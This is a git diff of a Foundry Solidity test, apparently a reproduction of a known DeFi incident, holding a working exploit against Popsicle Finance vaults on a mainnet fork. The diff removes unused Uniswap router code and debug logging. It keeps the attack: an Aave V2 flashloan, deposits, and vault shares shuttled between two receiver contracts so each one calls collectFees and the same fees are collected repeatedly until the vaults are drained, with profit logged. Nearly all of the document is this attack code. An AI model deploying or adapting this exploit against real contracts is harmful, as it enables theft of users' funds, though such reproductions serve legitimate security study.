@@ -4,300 +4,26 @@ pragma solidity ^0.8.10;
 import "forge-std/Test.sol";
 import "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";
 
-interface IUniswapV2Router {
-    function WETH() external view returns (address);
-
-    function addLiquidity(
-        address tokenA,
-        address tokenB,
-        uint256 amountADesired,
-        uint256 amountBDesired,
-        uint256 amountAMin,
-        uint256 amountBMin,
-        address to,
-        uint256 deadline
-    ) external returns (uint256 amountA, uint256 amountB, uint256 liquidity);
-
-    function addLiquidityETH(
-        address token,
-        uint256 amountTokenDesired,
-        uint256 amountTokenMin,
-        uint256 amountETHMin,
-        address to,
-        uint256 deadline
-    ) external payable returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);
-
-    function factory() external view returns (address);
-
-    function getAmountIn(
-        uint256 amountOut,
-        uint256 reserveIn,
-        uint256 reserveOut
-    ) external pure returns (uint256 amountIn);
-
-    function getAmountOut(
-        uint256 amountIn,
-        uint256 reserveIn,
-        uint256 reserveOut
-    ) external pure returns (uint256 amountOut);
-
-    function getAmountsIn(uint256 amountOut, address[] memory path) external view returns (uint256[] memory amounts);
-
-    function getAmountsOut(uint256 amountIn, address[] memory path) external view returns (uint256[] memory amounts);
-
-    function quote(uint256 amountA, uint256 reserveA, uint256 reserveB) external pure returns (uint256 amountB);
-
-    function removeLiquidity(
-        address tokenA,
-        address tokenB,
-        uint256 liquidity,
-        uint256 amountAMin,
-        uint256 amountBMin,
-        address to,
-        uint256 deadline
-    ) external returns (uint256 amountA, uint256 amountB);
-
-    function removeLiquidityETH(
-        address token,
-        uint256 liquidity,
-        uint256 amountTokenMin,
-        uint256 amountETHMin,
-        address to,
-        uint256 deadline
-    ) external returns (uint256 amountToken, uint256 amountETH);
-
-    function removeLiquidityETHSupportingFeeOnTransferTokens(
-        address token,
-        uint256 liquidity,
-        uint256 amountTokenMin,
-        uint256 amountETHMin,
-        address to,
-        uint256 deadline
-    ) external returns (uint256 amountETH);
-
-    function removeLiquidityETHWithPermit(
-        address token,
-        uint256 liquidity,
-        uint256 amountTokenMin,
-        uint256 amountETHMin,
-        address to,
-        uint256 deadline,
-        bool approveMax,
-        uint8 v,
-        bytes32 r,
-        bytes32 s
-    ) external returns (uint256 amountToken, uint256 amountETH);
-
-    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
-        address token,
-        uint256 liquidity,
-        uint256 amountTokenMin,
-        uint256 amountETHMin,
-        address to,
-        uint256 deadline,
-        bool approveMax,
-        uint8 v,
-        bytes32 r,
-        bytes32 s
-    ) external returns (uint256 amountETH);
-
-    function removeLiquidityWithPermit(
-        address tokenA,
-        address tokenB,
-        uint256 liquidity,
-        uint256 amountAMin,
-        uint256 amountBMin,
-        address to,
-        uint256 deadline,
-        bool approveMax,
-        uint8 v,
-        bytes32 r,
-        bytes32 s
-    ) external returns (uint256 amountA, uint256 amountB);
-
-    function swapETHForExactTokens(
-        uint256 amountOut,
-        address[] memory path,
-        address to,
-        uint256 deadline
-    ) external payable returns (uint256[] memory amounts);
-
-    function swapExactETHForTokens(
-        uint256 amountOutMin,
-        address[] memory path,
-        address to,
-        uint256 deadline
-    ) external payable returns (uint256[] memory amounts);
-
-    function swapExactETHForTokensSupportingFeeOnTransferTokens(
-        uint256 amountOutMin,
-        address[] memory path,
-        address to,
-        uint256 deadline
-    ) external payable;
-
-    function swapExactTokensForETH(
-        uint256 amountIn,
-        uint256 amountOutMin,
-        address[] memory path,
-        address to,
-        uint256 deadline
-    ) external returns (uint256[] memory amounts);
-
-    function swapExactTokensForETHSupportingFeeOnTransferTokens(
-        uint256 amountIn,
-        uint256 amountOutMin,
-        address[] memory path,
-        address to,
-        uint256 deadline
-    ) external;
-
-    function swapExactTokensForTokens(
-        uint256 amountIn,
-        uint256 amountOutMin,
-        address[] memory path,
-        address to,
-        uint256 deadline
-    ) external returns (uint256[] memory amounts);
-
-    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
-        uint256 amountIn,
-        uint256 amountOutMin,
-        address[] memory path,
-        address to,
-        uint256 deadline
-    ) external;
-
-    function swapTokensForExactETH(
-        uint256 amountOut,
-        uint256 amountInMax,
-        address[] memory path,
-        address to,
-        uint256 deadline
-    ) external returns (uint256[] memory amounts);
-
-    function swapTokensForExactTokens(
-        uint256 amountOut,
-        uint256 amountInMax,
-        address[] memory path,
-        address to,
-        uint256 deadline
-    ) external returns (uint256[] memory amounts);
-
-    receive() external payable;
-}
-
 interface IPopsicle {
-    function DOMAIN_SEPARATOR() external view returns (bytes32);
-
-    function acceptGovernance() external;
-
-    function accruedProtocolFees0() external view returns (uint256);
-
-    function accruedProtocolFees1() external view returns (uint256);
-
-    function allowance(address owner, address spender) external view returns (uint256);
-
-    function approve(address spender, uint256 amount) external returns (bool);
-
     function balanceOf(address account) external view returns (uint256);
 
     function collectFees(uint256 amount0, uint256 amount1) external;
-
-    function collectProtocolFees(uint256 amount0, uint256 amount1) external;
-
-    function decimals() external view returns (uint8);
-
-    function decreaseAllowance(address spender, uint256 subtractedValue) external returns (bool);
 
     function deposit(
         uint256 amount0Desired,
         uint256 amount1Desired
     ) external payable returns (uint256 shares, uint256 amount0, uint256 amount1);
 
-    function finalized() external view returns (bool);
-
-    function governance() external view returns (address);
-
-    function increaseAllowance(address spender, uint256 addedValue) external returns (bool);
-
-    function init() external;
-
-    function name() external view returns (string memory);
-
-    function nonces(address owner) external view returns (uint256);
-
-    function pendingGovernance() external view returns (address);
-
-    function permit(
-        address owner,
-        address spender,
-        uint256 value,
-        uint256 deadline,
-        uint8 v,
-        bytes32 r,
-        bytes32 s
-    ) external;
-
-    function pool() external view returns (address);
-
-    function position()
-        external
-        view
-        returns (
-            uint128 liquidity,
-            uint256 feeGrowthInside0LastX128,
-            uint256 feeGrowthInside1LastX128,
-            uint128 tokensOwed0,
-            uint128 tokensOwed1
-        );
-
-    function rebalance() external;
-
-    function rerange() external;
-
-    function setGovernance(address _governance) external;
-
-    function setStrategy(address _strategy) external;
-
-    function strategy() external view returns (address);
-
     function symbol() external view returns (string memory);
-
-    function tickLower() external view returns (int24);
-
-    function tickSpacing() external view returns (int24);
-
-    function tickUpper() external view returns (int24);
 
     function token0() external view returns (address);
 
-    function token0PerShareStored() external view returns (uint256);
-
     function token1() external view returns (address);
-
-    function token1PerShareStored() external view returns (uint256);
-
-    function totalSupply() external view returns (uint256);
-
-    function transfer(address recipient, uint256 amount) external returns (bool);
-
-    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
-
-    function uniswapV3MintCallback(uint256 amount0, uint256 amount1, bytes memory data) external;
-
-    function uniswapV3SwapCallback(int256 amount0, int256 amount1, bytes memory _data) external;
 
     function userInfo(address)
         external
         view
         returns (uint256 token0Rewards, uint256 token1Rewards, uint256 token0PerSharePaid, uint256 token1PerSharePaid);
-
-    function usersFees0() external view returns (uint256);
-
-    function usersFees1() external view returns (uint256);
-
-    function weth() external view returns (address);
 
     function withdraw(uint256 shares) external returns (uint256 amount0, uint256 amount1);
 }
@@ -326,7 +52,6 @@ contract TokenVault {
     function transfer(address _asset, address _to) external {
         uint256 bal = IERC20X(_asset).balanceOf(address(this));
         if (bal > 0) IERC20X(_asset).safeTransfer(_to, bal);
-        else console.log("no bal");
     }
 
     function executeCall(address target, bytes calldata dataTocall) external returns (bool succ) {
@@ -385,8 +110,6 @@ contract PopsicleExp is Test {
     IERC20X dai = IERC20X(_dai);
     IERC20X uni = IERC20X(_uni);
 
-    IUniswapV2Router router = IUniswapV2Router(payable(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D));
-
     function setUp() public {
         vm.createSelectFork("mainnet", 12_955_000); //fork gnosis at block number 21120319
 
@@ -433,24 +156,10 @@ contract PopsicleExp is Test {
         return IERC20X(asset).balanceOf(address(this));
     }
 
-    function approveFunds() internal {
-        //Approve funds to be taken back after flashloan
-        approveToTargetAll(address(aaveV2));
-
-        approveToTarget(_weth, address(router));
-    }
-
     function testExploit() public {
         _logBalances("Before attack");
-        //Flashloan here
         aaveV2.flashLoan(address(this), assetsArr, amountsArr, modesArr, address(this), new bytes(0), 0);
         _logBalances("After attack");
-    }
-
-    function getPath(address _in, address _out) internal returns (address[] memory path) {
-        path = new address[](2);
-        path[0] = _in;
-        path[1] = _out;
     }
 
     function executeOperation(
@@ -461,41 +170,17 @@ contract PopsicleExp is Test {
         bytes calldata params
     ) external payable returns (bool) {
         attackLogic();
-
         //Check we are in profit on each asset
         for (uint256 i = 0; i < assets.length; i++) {
             uint256 bal = _logTokenBal(assets[i]);
-            uint256 missingAmt = bal >= (amounts[i] + premiums[i]) ? 0 : (amounts[i] + premiums[i]) - bal;
-            address asset = assets[i];
-            if (missingAmt > 0) {
-                if (missingAmt == premiums[i]) {
-                    console.log("we are missing a premium of %d for asset %d", missingAmt, i);
-                } else if (missingAmt > premiums[i]) {
-                    console.log("we are missing tokens itself for %d", i);
-                } else if (missingAmt != premiums[i]) {
-                    console.log("missing %d asset of %d", missingAmt, i);
-                }
-                //We just swap,figure out why we are less here,maybe flashloan fees put  us lower?
-                router.swapExactTokensForTokens(
-                    router.getAmountsIn(missingAmt, getPath(_weth, asset))[0],
-                    0,
-                    getPath(_weth, asset),
-                    address(this),
-                    block.timestamp
-                );
-            } else {
-                emit log_named_decimal_uint(
-                    "Profit ", (bal - (amounts[i] + premiums[i])), IERC20X(assets[i]).decimals()
-                );
-                console.log(" for asset ", IERC20X(assets[i]).name());
-            }
+            emit log_named_decimal_uint("Profit ", (bal - (amounts[i] + premiums[i])), IERC20X(assets[i]).decimals());
+            console.log(" for asset ", IERC20X(assets[i]).name());
         }
+        approveToTargetAll(address(aaveV2));
         return true;
     }
-    //This should be called on executeoperation on a aave v2 flashloan
 
     function attackLogic() internal {
-        approveFunds();
         for (uint256 i = 0; i < vaultsArr.length; i++) {
             //Approve funds for vault
             IPopsicle vault = IPopsicle(vaultsArr[i]);
@@ -506,7 +191,6 @@ contract PopsicleExp is Test {
             );
             drainVault(vaultsArr[i]);
         }
-
         claimFundsFromReceivers();
     }
 
@@ -530,17 +214,13 @@ contract PopsicleExp is Test {
 
     function claimFees(address _vault) internal {
         (uint256 token0fees, uint256 token1fees,,) = IPopsicle(_vault).userInfo(address(this));
-
         //Collect fees
-        IPopsicle(_vault).collectFees(token0fees, token1fees);
         IPopsicle(_vault).withdraw(IPopsicle(_vault).balanceOf(address(this)));
         (uint256 token0feesr1, uint256 token1feesr1,,) = IPopsicle(_vault).userInfo(address(receiver1));
 
-        console.log("claimed initial fees success");
         receiver1.executeCall(
             _vault, abi.encodeWithSelector(IPopsicle.collectFees.selector, token0feesr1, token1feesr1)
         );
-        console.log("claimed recievcer1 fees success");
         (uint256 token0feesr2, uint256 token1feesr2) = (
             IERC20X(address(IPopsicle(_vault).token0())).balanceOf(_vault),
             IERC20X(address(IPopsicle(_vault).token1())).balanceOf(_vault)
@@ -549,25 +229,24 @@ contract PopsicleExp is Test {
         receiver2.executeCall(
             _vault, abi.encodeWithSelector(IPopsicle.collectFees.selector, token0feesr2, token1feesr2)
         );
-        console.log("claimed recievcer2 fees success");
-
         console.log("Self - Token0 Fees:", token0fees, "Token1 Fees:", token1fees);
         console.log("Receiver1 - Token0 Fees:", token0feesr1, "Token1 Fees:", token1feesr1);
         console.log("Receiver2 - Token0 Fees:", token0feesr2, "Token1 Fees:", token1feesr2);
     }
 
     function transferAround(address _vault) internal {
-        console.log("entered transferaround");
         IERC20X asset = IERC20X(_vault);
+
         uint256 bal = asset.balanceOf(address(this));
         IPopsicle(_vault).collectFees(0, 0);
+
         asset.transfer(address(receiver1), bal);
         receiver1.executeCall(_vault, abi.encodeWithSelector(IPopsicle.collectFees.selector, 0, 0));
         receiver1.transfer(_vault, address(receiver2));
+
         receiver2.executeCall(_vault, abi.encodeWithSelector(IPopsicle.collectFees.selector, 0, 0));
         receiver2.transfer(_vault, address(this));
-        IPopsicle(_vault).collectFees(0, 0);
 
-        console.log("finished transferaround");
+        IPopsicle(_vault).collectFees(0, 0);
     }
 }
